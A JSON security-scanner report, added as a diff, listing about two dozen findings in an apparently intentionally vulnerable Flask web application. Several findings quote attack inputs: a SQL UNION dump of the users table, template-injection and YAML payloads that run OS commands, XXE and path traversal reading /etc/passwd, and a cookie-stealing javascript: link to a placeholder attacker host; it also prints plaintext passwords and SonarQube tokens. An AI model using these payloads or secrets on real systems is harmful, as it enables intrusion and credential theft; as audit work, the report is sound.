@@ -1,0 +1,692 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "security.injection.sql-injection",
+      "path": "target/project/models/Dashboard.py",
+      "start": {
+        "line": 7,
+        "col": 12,
+        "offset": 0
+      },
+      "end": {
+        "line": 7,
+        "col": 78,
+        "offset": 0
+      },
+      "extra": {
+        "message": "SQL injection: the `pageId` URL path segment from `/dashboard/<pageId>` (target/project/controllers/Dashboard.py:7-12) is passed unvalidated into `Dashboard.getPage()` and string-concatenated into the query `'SELECT pageId, title, content FROM pages WHERE pageId='+pageId`. No parameterisation or type check is performed (the only guard, `if pageId == 0`, compares a str to an int and never fires). An attacker can request e.g. `/dashboard/1 UNION SELECT 1,UserName,Password FROM users--` to dump the users table, including password hashes.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.injection.server-side-template-injection",
+      "path": "target/project/controllers/404.py",
+      "start": {
+        "line": 94,
+        "col": 7,
+        "offset": 0
+      },
+      "end": {
+        "line": 95,
+        "col": 44,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Server-side template injection leading to remote code execution. The 404 error handler interpolates the fully attacker-controlled `request.url` into an HTML string via `.format(request.url)` (line 94, substituted at the `{0}` placeholder on line 75), then renders that concatenated string with `render_template_string(template)` (line 95). Any Jinja2 expression in the requested URL is evaluated server-side, e.g. requesting `/{{7*7}}` or a payload reaching `__subclasses__`/`os.popen` yields arbitrary code execution. The same flow is also a reflected XSS sink since the raw URL is emitted into the response body.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine",
+            "CWE-94: Code Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.deserialization.pickle-load-untrusted",
+      "path": "target/project/controllers/About.py",
+      "start": {
+        "line": 27,
+        "col": 17,
+        "offset": 0
+      },
+      "end": {
+        "line": 27,
+        "col": 36,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Insecure deserialization of untrusted data leading to remote code execution. `POST /about/sync` reads the `data_obj` form field, hex-decodes it with `bytes.fromhex(att)` (line 23), writes the raw attacker bytes to `../pickle.hacker` (line 24), then immediately deserialises that file with `pickle.load(handle)` (line 27). `pickle` executes `__reduce__` during unpickling, so any client can submit a hex-encoded pickle payload that runs arbitrary OS commands as the application user. The route requires no authentication.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-502: Deserialization of Untrusted Data"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.deserialization.yaml-unsafe-load",
+      "path": "target/project/controllers/Information.py",
+      "start": {
+        "line": 18,
+        "col": 23,
+        "offset": 0
+      },
+      "end": {
+        "line": 18,
+        "col": 43,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Insecure deserialization leading to remote code execution. The `<input>` URL segment of `/information/<input>` is base64-decoded (line 17) and passed to `yaml.load(yaml_file)` without a `Loader` argument (line 18). With the pinned `pyyaml==3.13` (target/requirements.txt:6), the default loader honours the `!!python/object/apply:` tag, so an unauthenticated attacker can base64-encode a payload such as `!!python/object/apply:os.system ['id']` into the path and execute arbitrary commands. Use `yaml.safe_load`.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-502: Deserialization of Untrusted Data"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.xml.xxe-external-entity",
+      "path": "target/project/controllers/Validator.py",
+      "start": {
+        "line": 15,
+        "col": 11,
+        "offset": 0
+      },
+      "end": {
+        "line": 15,
+        "col": 48,
+        "offset": 0
+      },
+      "extra": {
+        "message": "XML External Entity processing on untrusted input. `POST /validator/upload` passes the raw `customers` form field to `xml.dom.pulldom.parseString()` (line 15) and then explicitly calls `doc.expandNode(node)` (line 20) to force entity expansion, echoing the expanded document back to the user via `node.toxml()` (lines 20-21). No parser hardening is applied (no `defusedxml`, no disabling of `feature_external_ges`/DTD loading), so a DOCTYPE declaring `<!ENTITY xxe SYSTEM \"file:///etc/passwd\">` can disclose local files or trigger SSRF, and nested internal entities (billion-laughs) can exhaust memory.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.path-traversal.arbitrary-file-read",
+      "path": "target/project/controllers/Validator.py",
+      "start": {
+        "line": 29,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 31,
+        "col": 76,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Path traversal / arbitrary file read. `/validator/getXML` takes the `example_file` form field directly as a filesystem path (line 29) and passes it unmodified to `open(fileName, \"r\")` (line 30) and `send_file(fileName, attachment_filename=fileName)` (line 31). There is no canonicalisation, no confinement to a base directory, and no allowlist, so an unauthenticated request with `example_file=../../../../etc/passwd` (or `Database.db` to steal the credentials table) returns the contents of any file readable by the server process.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)",
+            "CWE-73: External Control of File Name or Path"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.path-traversal.unrestricted-upload-path",
+      "path": "target/project/controllers/Validator.py",
+      "start": {
+        "line": 48,
+        "col": 13,
+        "offset": 0
+      },
+      "end": {
+        "line": 48,
+        "col": 44,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Externally controlled file path on write / unrestricted upload. `/validator/uploads` uses the client-supplied `file.filename` verbatim (line 46) and concatenates it into the destination: `file.save('uploads/'+filename)` (line 48). `werkzeug.utils.secure_filename` is never applied and the only check, `allowed_file()` (lines 36-38), merely inspects the extension after the last dot, so a multipart filename such as `../../project/controllers/evil.html` \u2014 or `../../project/templates/layout/layout.html` to overwrite a rendered template \u2014 escapes the upload directory and writes attacker content to arbitrary paths. The extension allowlist also permits `html`, and the endpoint requires no authentication.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-73: External Control of File Name or Path",
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.access-control.missing-authentication-session-grant",
+      "path": "target/project/controllers/Webmaster.py",
+      "start": {
+        "line": 12,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 12,
+        "col": 32,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Authentication bypass. The unauthenticated `/webmaster` route sets `session['loggedin'] = random` (line 12) without verifying any credential whatsoever. `/confidential` (target/project/controllers/Confidential.py:8) authorises solely on the truthiness of `session['loggedin']`, and target/project/templates/layout/layout.html:100 gates the Confidential/Validator/Monitoring links on the same value. Any anonymous visitor can therefore issue a single GET to `/webmaster` to obtain a fully privileged session and bypass the login flow entirely.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function",
+            "CWE-288: Authentication Bypass Using an Alternate Path or Channel"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.access-control.missing-authorization",
+      "path": "target/project/controllers/Webmaster.py",
+      "start": {
+        "line": 7,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 8,
+        "col": 18,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Missing authorization on a route that discloses secret credentials. `/webmaster` is registered with no authentication or authorization check of any kind (no decorator, no `before_request` hook, no session validation anywhere in the request path \u2014 grep confirms no `login_required`/`before_request` in the codebase), yet it renders target/project/templates/webmaster/index.html, which is titled \"Secret credentials for accountancy\" and prints plaintext usernames, passwords (`Thisismysecretpass`, `BirdLover1`, `Letmein123`) and secret ids. The route is reachable by any anonymous client; the UI merely hides the link.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.access-control.missing-authorization-monitoring",
+      "path": "target/project/controllers/Monitoring.py",
+      "start": {
+        "line": 6,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 8,
+        "col": 49,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Missing authorization leading to sensitive host information disclosure. `/monitoring` has no authentication or authorization check (lines 6-8), and the template it renders executes host commands and prints their raw output: target/project/templates/monitoring/index.html:10 emits `ps aux | grep 8081` and line 22 emits the full contents of `/etc/passwd`. Any unauthenticated client can enumerate local user accounts and running processes/command lines. The sidebar link is session-gated in the layout, but the server enforces nothing.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.access-control.missing-authorization-validator",
+      "path": "target/project/controllers/Validator.py",
+      "start": {
+        "line": 27,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 28,
+        "col": 22,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Missing authorization on privileged file-handling endpoints. `/validator`, `/validator/upload`, `/validator/getXML` (line 27) and `/validator/uploads` expose XML parsing, arbitrary file download and file upload with no authentication or authorization check in the request path \u2014 the application defines no `before_request` hook, no auth decorator, and these handlers never consult `session`. Only the sidebar link in target/project/templates/layout/layout.html is session-gated, which is client-side concealment rather than access control.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.xss.reflected-autoescape-disabled",
+      "path": "target/project/controllers/Search.py",
+      "start": {
+        "line": 10,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 10,
+        "col": 71,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Reflected cross-site scripting. The `search` form field (line 9) is passed straight into the `search/index.html` template (line 10), which renders it inside an explicit `{% autoescape false %}` block: target/project/templates/search/index.html:13 emits `{{search}}` with escaping disabled. A payload such as `<script>alert(document.cookie)</script>` in the `search` parameter executes in the victim's browser; the handler additionally strips the browser's own filter by setting `X-XSS-Protection: 0` (line 11).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.headers.xss-protection-disabled",
+      "path": "target/project/controllers/Search.py",
+      "start": {
+        "line": 11,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 11,
+        "col": 43,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Security misconfiguration: the `/search` response explicitly disables the browser's XSS auditor with `r.headers.set('X-XSS-Protection', '0')`. This deliberately removes a defence-in-depth control on the very endpoint that renders unescaped user input (see the reflected XSS at line 10), making exploitation reliable on browsers that would otherwise block the reflection. No Content-Security-Policy, `X-Frame-Options`, or `X-Content-Type-Options` header is set anywhere in the application either.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-16: Configuration"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.xss.stored-javascript-uri",
+      "path": "target/project/templates/messaging/index.html",
+      "start": {
+        "line": 56,
+        "col": 25,
+        "offset": 0
+      },
+      "end": {
+        "line": 56,
+        "col": 71,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Stored cross-site scripting via an attacker-controlled URI scheme. `POST /messaging/new` (target/project/controllers/Messaging.py:16) persists the unvalidated `link` form field, and this template renders it as `href=\"{{item[3]}}\"` for every visitor of `/messaging`. Jinja escapes quotes but not the scheme, so storing `javascript:fetch('//attacker/'+document.cookie)` yields script execution when any other user clicks the \"Check Source\" link. The scheme is never restricted to http/https.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.xss.autoescape-disabled-about",
+      "path": "target/project/templates/about/index.html",
+      "start": {
+        "line": 21,
+        "col": 26,
+        "offset": 0
+      },
+      "end": {
+        "line": 21,
+        "col": 73,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Cross-site scripting through disabled output escaping. This template wraps `{{content}}` in `{% autoescape false %}`, and `content` is the object deserialised from attacker-supplied pickle bytes in `POST /about/sync` (target/project/controllers/About.py:27-29). An attacker who submits a pickle whose result is (or stringifies to) HTML gets it rendered raw into the `/about` page, and because the payload is written to `../pickle.hacker` on disk the injected markup is served to subsequent visitors as well.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.command-injection.os-popen-template-global",
+      "path": "target/project/controllers/Monitoring.py",
+      "start": {
+        "line": 12,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 14,
+        "col": 22,
+        "offset": 0
+      },
+      "extra": {
+        "message": "A shell-executing helper is injected into the global Jinja context. `@app.context_processor` registers `system_call(command)`, which runs `os.popen(command).read()` (line 13) and is therefore callable as `{{ system_call(...) }}` from every template in the application. Combined with the server-side template injection in the 404 handler (target/project/controllers/404.py:94-95), where the attacker controls template source, this provides a direct one-shot OS command execution primitive \u2014 e.g. requesting `/{{system_call('id')}}` \u2014 without needing any Jinja sandbox escape.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.secrets.hardcoded-flask-secret-key",
+      "path": "target/project/__init__.py",
+      "start": {
+        "line": 5,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 5,
+        "col": 39,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Hardcoded, trivially guessable session signing key: `app.config['SECRET_KEY'] = 'random'`. Flask signs its client-side session cookie with this value, so anyone who knows or brute-forces it can forge a cookie containing `loggedin`, defeating the session check in target/project/controllers/Confidential.py:8. The key is committed to source control and shared across every deployment; it should be loaded from the environment with high entropy.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.misconfiguration.debug-enabled",
+      "path": "target/project/__init__.py",
+      "start": {
+        "line": 6,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 6,
+        "col": 18,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Active debug functionality enabled unconditionally at import time (`app.debug = True`), with no environment guard. The app is served by `app.run('0.0.0.0', port=port)` (target/runserver.py:10) and containerised for deployment (target/Dockerfile), so this ships to production: the Werkzeug interactive debugger renders full stack traces, source snippets and local variables on any unhandled exception, and its console permits arbitrary Python execution if the PIN is obtained or disabled. Unhandled errors are readily triggered, e.g. the `KeyError` from `session['loggedin']` at target/project/controllers/Confidential.py:8 for any non-logged-in visitor.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-489: Active Debug Code",
+            "CWE-215: Insertion of Sensitive Information Into Debugging Code"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.cors.wildcard-origin-with-credentials",
+      "path": "target/runserver.py",
+      "start": {
+        "line": 8,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 8,
+        "col": 66,
+        "offset": 0
+      },
+      "extra": {
+        "message": "CORS is configured to permit any origin on every route: `CORS(app, resources={r\"/*\": {\"origins\": \"*\"}})`. Paired with `Access-Control-Allow-Credentials: true` on the authenticated `/confidential` response (target/project/controllers/Confidential.py:10), this lets a page on any attacker-controlled domain issue credentialed cross-origin requests to this application using the victim's session cookie and read the confidential response body.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains",
+            "CWE-16: Configuration"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.cors.allow-credentials-on-sensitive-route",
+      "path": "target/project/controllers/Confidential.py",
+      "start": {
+        "line": 10,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 10,
+        "col": 71,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The `/confidential` handler explicitly sets `Access-Control-Allow-Credentials: true` on a response containing confidential salary/executive data. Because the allowed origin for this route is the wildcard configured in target/runserver.py:8, a cross-origin page can read this authenticated response with the victim's cookies attached. Credentialed CORS must be paired with a strict origin allowlist and `Vary: Origin`.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.auth.hardcoded-credentials",
+      "path": "target/project/controllers/Login.py",
+      "start": {
+        "line": 12,
+        "col": 8,
+        "offset": 0
+      },
+      "end": {
+        "line": 12,
+        "col": 51,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Hard-coded credentials used as the sole authentication mechanism: `if(password == \"admin\" and username == \"admin\")`. The comparison is against literals embedded in source rather than a credential store, so the account cannot be rotated or revoked and the password is exposed to anyone with repository access. The comparison is also non-constant-time, and the subsequent branches (lines 18-21) act as a username/password oracle by returning distinct \"invalid username\" vs \"invalid password for username\" messages.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials",
+            "CWE-259: Use of Hard-coded Password"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.auth.missing-brute-force-protection",
+      "path": "target/project/controllers/Login.py",
+      "start": {
+        "line": 7,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 8,
+        "col": 12,
+        "offset": 0
+      },
+      "extra": {
+        "message": "No brute-force protection on the authentication endpoint. `POST /login` accepts unlimited credential attempts: there is no rate limiter, no attempt counter, no lockout, no CAPTCHA and no delay \u2014 the application registers no `before_request` hook and no rate-limiting extension anywhere (target/requirements.txt lists only Flask, Flask-WTF, Jinja2, Flask-DebugToolbar, flask-cors and pyyaml). The differentiated error responses at lines 18-21 further let an attacker confirm valid usernames before guessing passwords.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-307: Improper Restriction of Excessive Authentication Attempts"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.logging.missing-security-event-logging",
+      "path": "target/project/controllers/Login.py",
+      "start": {
+        "line": 12,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 21,
+        "col": 78,
+        "offset": 0
+      },
+      "extra": {
+        "message": "No security audit logging for authentication events. Neither successful logins (line 12-16, which grants a privileged session) nor failed attempts (lines 17-21) emit any log record; the application imports no logging module and defines no logging middleware, `before_request`/`after_request` hook, or error hook anywhere in target/project. The same absence covers the privilege grant in target/project/controllers/Webmaster.py:12 and the sensitive file access in target/project/controllers/Validator.py:29-31. Without durable events, credential-guessing campaigns and access-control abuse cannot be detected or investigated.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-778: Insufficient Logging"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.csrf.missing-protection",
+      "path": "target/project/controllers/Messaging.py",
+      "start": {
+        "line": 12,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 19,
+        "col": 55,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Missing CSRF protection on state-changing POST endpoints. `/messaging/new` writes attacker-supplied content to the database (line 19) with no anti-CSRF token validation: although Flask-WTF is a declared dependency (target/requirements.txt:2), `CSRFProtect` is never instantiated and no token is checked in any handler or template, and the session cookie has no `SameSite` attribute configured. A third-party page can therefore force an authenticated victim's browser to post messages \u2014 which, per the stored XSS at target/project/templates/messaging/index.html:56, also plants persistent script. The same gap applies to `POST /about/sync`, `/validator/upload`, `/validator/uploads` and `/validator/getXML`.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-352: Cross-Site Request Forgery (CSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.cookie.missing-secure-flag",
+      "path": "target/project/__init__.py",
+      "start": {
+        "line": 5,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 6,
+        "col": 18,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Session cookie hardening is never configured. The app sets only `SECRET_KEY` and `debug`; `SESSION_COOKIE_SECURE` and `SESSION_COOKIE_SAMESITE` are left at their insecure Flask defaults (`False`/`None`), so the session cookie that authorises `/confidential` (target/project/controllers/Confidential.py:8) is transmitted over plaintext HTTP \u2014 the server is started without TLS in target/runserver.py:10 \u2014 and is attached to cross-site requests, enabling both network interception and CSRF.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute",
+            "CWE-1275: Sensitive Cookie with Improper SameSite Attribute"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.secrets.hardcoded-credentials-in-db-initializer",
+      "path": "target/project/config/initializer.py",
+      "start": {
+        "line": 15,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 18,
+        "col": 84,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Hard-coded account credentials seeded from source, protected only by unsalted MD5. The initializer inserts the `Admin`, `User`, `Guest` and `Plebian` accounts with 32-hex-character MD5 digests as their passwords (e.g. `0cef1fb10f60529028a71f58e54ed07b` for `Admin`). MD5 is a fast, collision-prone hash unsuitable for password storage and no per-user salt is applied, so these digests are recoverable instantly from rainbow tables \u2014 and the SQL injection in target/project/models/Dashboard.py:7 lets an unauthenticated attacker extract the whole table. Use a slow, salted KDF (bcrypt/argon2) and provision credentials outside version control.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials",
+            "CWE-916: Use of Password Hash With Insufficient Computational Effort"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.secrets.hardcoded-token-in-ci-config",
+      "path": "Jenkinsfile",
+      "start": {
+        "line": 25,
+        "col": 22,
+        "offset": 0
+      },
+      "end": {
+        "line": 25,
+        "col": 190,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Hard-coded SonarQube authentication token committed to CI configuration: the `Bandit Analysis` post step passes `-Dsonar.login=9ba67e580e0b13f75b07404f028732945c66a219` on the shell command line. A second token (`b6029f0cfea17d68ee8aa0607b7b2aea6683dfb5`) is embedded in the commented command at line 14. Anyone with repository read access \u2014 or anyone able to view the build log or the process list on the agent \u2014 obtains these credentials and can authenticate to the analysis server. Tokens belong in Jenkins credentials bound via `withCredentials`/`withSonarQubeEnv`, not in source.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials",
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
